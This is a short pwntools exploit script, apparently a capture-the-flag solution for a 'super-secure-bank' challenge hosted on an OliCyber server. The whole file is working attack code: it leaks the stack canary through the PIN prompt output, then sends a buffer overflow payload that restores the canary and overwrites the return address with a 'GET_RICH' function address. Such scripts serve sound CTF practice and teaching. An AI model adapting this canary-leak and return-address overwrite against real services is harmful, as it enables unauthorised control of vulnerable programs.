from pwn import *

GET_RICH = 0x0040077d

io = remote("super-secure-bank.challs.olicyber.it", 38080)

io.sendlineafter(b"Choice: ", b"1")
io.sendlineafter(b"Insert your bank name length (max 15): ", b"14")

io.sendlineafter(b"Insert your credit card pin: ", b"1" * 8)

offset = len("Ok..... credit card pin is: 11111111\n")

line = io.recvuntil(b"Insert")
print(line)
canary = b"\x00" + line[offset:offset + 7]
print("CANARY IS : ", canary)

payload = b"a" * (0x28 - 0x10) + canary + b"a" * 8 + p64(GET_RICH)

io.sendlineafter(b" your bank name: ", payload)

io.interactive()
